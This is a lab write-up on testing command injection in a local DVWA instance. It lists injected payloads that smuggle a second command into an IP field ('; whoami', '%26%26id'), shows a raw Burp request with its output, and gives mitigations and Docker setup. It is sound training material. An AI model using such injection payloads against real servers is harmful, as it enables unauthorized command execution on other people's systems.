DVWA Command Injection Lab
Project Overview
Testing command injection vulnerabilities on Damn Vulnerable Web Application (DVWA) with security level set to Low.

Target
Application: DVWA (Damn Vulnerable Web Application)

Module: Command Injection

Security Level: Low

URL: http://localhost:8080/vulnerabilities/exec/

Payloads Tested
Direct Command Injection
127.0.0.1; whoami

Result: Output showed www-data (web server user) - Confirmed direct execution

Blind Injection (Timing-Based)
127.0.0.1; ping -c 4 127.0.0.1

Result: Increased response time confirmed execution even when output was suppressed

Encoded Payload via Burp Repeater
ip=127.0.0.1%26%26id

Result: Response showed uid=33(www-data) gid=33(www-data) - Definitive proof

Proof of Execution
Payload	Method	Result
127.0.0.1; whoami	Browser form	www-data
127.0.0.1; ping -c 4 127.0.0.1	POST request	Timing difference
127.0.0.1%26%26id	Burp Repeater	uid=33(www-data)
Vulnerabilities Identified
No input sanitization on user-supplied IP address

Direct shell command execution without validation

Command output returned to browser (not blind)

Tools Used
DVWA (Docker container)

Burp Suite (Repeater)

Firefox Browser

curl (for timing tests)

Example Burp Repeater Request
Request:
POST /vulnerabilities/exec/ HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1%26%26id

Response (showing successful execution):
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Mitigations
Input validation with allow-lists (only allow IP addresses, no special characters)

Avoid shell invocation (use parameterized APIs instead of system() or exec())

Escape user input before passing to shell

Run web processes with least privilege (not as root)

Use safe libraries for OS interactions

Docker Setup (Reproducibility)
docker pull vulnerables/web-dvwa:latest
docker run -d --name dvwa -p 8080:80 vulnerables/web-dvwa:latest

Then open http://localhost:8080/setup.php, click "Create/Reset Database", login with admin/password, and set Security Level to "Low"

Author
Aashray Lath
